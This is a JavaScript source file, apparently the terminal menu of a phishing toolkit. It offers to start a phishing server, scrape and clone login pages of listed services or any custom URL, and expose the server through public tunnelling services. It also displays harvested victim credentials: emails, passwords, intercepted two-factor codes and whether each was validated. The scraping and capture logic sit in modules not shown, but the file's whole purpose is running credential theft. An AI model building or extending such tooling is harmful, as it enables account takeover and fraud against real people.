import inquirer from 'inquirer';
import { listServices } from './service-registry.js';
import { captureStore } from './capture.js';
import chalk from 'chalk';

export async function mainMenu() {
  const { action } = await inquirer.prompt([{
    type: 'list',
    name: 'action',
    message: 'What would you like to do?',
    choices: [
      { name: '  🎣  Serve a page (start phishing server)', value: 'serve' },
      { name: '  📥  Scrape a page', value: 'scrape' },
      { name: '  🔗  Start a tunnel', value: 'tunnel' },
      { name: '  📋  View captures', value: 'captures' },
      { name: '  📦  List available pages', value: 'list' },
      { name: '  🚪  Exit', value: 'exit' },
    ],
  }]);
  return action;
}

export async function pickService() {
  const services = listServices();
  const choices = services.map(s => ({
    name: `  ${s.name.padEnd(20)} ${s.scraped ? chalk.green('✓ scraped') : chalk.gray('not scraped')}`,
    value: s.id,
  }));
  choices.push({ name: '  Enter custom URL', value: '__custom__' });

  const { service } = await inquirer.prompt([{
    type: 'list',
    name: 'service',
    message: 'Select a service:',
    choices,
    pageSize: 15,
  }]);

  if (service === '__custom__') {
    const { url } = await inquirer.prompt([{
      type: 'input',
      name: 'url',
      message: 'Enter login page URL:',
      validate: (v) => v.length > 0 ? true : 'URL required',
    }]);
    return { id: 'custom', name: url, url, custom: true };
  }

  return { id: service, name: services.find(s => s.id === service)?.name || service };
}

export async function pickServiceForScrape() {
  const services = listServices();
  const choices = services.map(s => ({
    name: `  ${s.name.padEnd(20)} ${s.scraped ? chalk.yellow('(re-scrape)') : chalk.gray('not scraped')}`,
    value: s.id,
  }));
  choices.push(
    { name: '  ───────────', value: '__sep__', disabled: true },
    { name: '  Enter custom URL', value: '__custom__' }
  );

  const { service } = await inquirer.prompt([{
    type: 'list',
    name: 'service',
    message: 'Select a service to scrape:',
    choices,
    pageSize: 15,
  }]);

  if (service === '__custom__') {
    const { url } = await inquirer.prompt([{
      type: 'input',
      name: 'url',
      message: 'Enter login page URL:',
      validate: (v) => v.length > 0 ? true : 'URL required',
    }]);
    const { name } = await inquirer.prompt([{
      type: 'input',
      name: 'name',
      message: 'Name for this service:',
      default: new URL(url).hostname.replace(/^www\./, '').split('.')[0],
    }]);
    return { id: name, name, url, custom: true };
  }

  return { id: service, name: services.find(s => s.id === service)?.name || service };
}

export async function pickTunnelType() {
  const { type } = await inquirer.prompt([{
    type: 'list',
    name: 'type',
    message: 'Select tunnel type:',
    choices: [
      { name: '  ngrok', value: 'ngrok' },
      { name: '  serveo.net', value: 'serveo' },
      { name: '  cloudflared', value: 'cloudflared' },
      { name: '  localhost.run', value: 'localhostrun' },
      { name: '  bore.pub', value: 'bore' },
    ],
  }]);
  return type;
}

export async function showCaptures() {
  const creds = captureStore.getAll();
  if (creds.length === 0) {
    console.log(chalk.gray('\n  No captures yet.\n'));
    return;
  }

  console.log(chalk.gray('─'.repeat(60)));
  console.log(chalk.white(`  📋 Captures (${creds.length} total)`));
  console.log(chalk.gray('─'.repeat(60)));

  creds.forEach((c, i) => {
    console.log(`  ${chalk.cyan(String(i + 1).padStart(3))}. ${chalk.yellow(c.service.padEnd(12))} ${chalk.white(c.email.padEnd(30))} ${chalk.green(c.password.padEnd(20))}${c.twofa_code ? chalk.magenta(' 2FA:' + c.twofa_code) : ''}${c.validated ? chalk.green(' ✓') : ''}`);
  });

  console.log(chalk.gray('─'.repeat(60)));

  const byService = captureStore.byService();
  console.log(chalk.gray('  By service:'));
  Object.entries(byService).forEach(([svc, count]) => {
    console.log(`    ${chalk.cyan(svc.padEnd(15))} ${chalk.white(count)}`);
  });

  console.log();
}
